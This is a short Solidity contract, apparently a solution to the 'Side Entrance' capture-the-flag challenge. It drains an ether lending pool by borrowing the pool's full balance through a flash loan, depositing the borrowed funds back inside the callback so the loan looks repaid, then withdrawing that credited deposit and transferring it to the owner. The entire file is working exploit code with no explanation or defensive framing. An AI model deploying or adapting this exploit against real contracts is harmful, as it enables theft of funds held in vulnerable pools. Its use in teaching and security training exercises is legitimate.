// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceAttacker {
    address payable public owner;
    IPool public pool;

    constructor(IPool _pool) {
        owner = payable(msg.sender);
        pool = _pool;
    }

    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        owner.transfer(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
 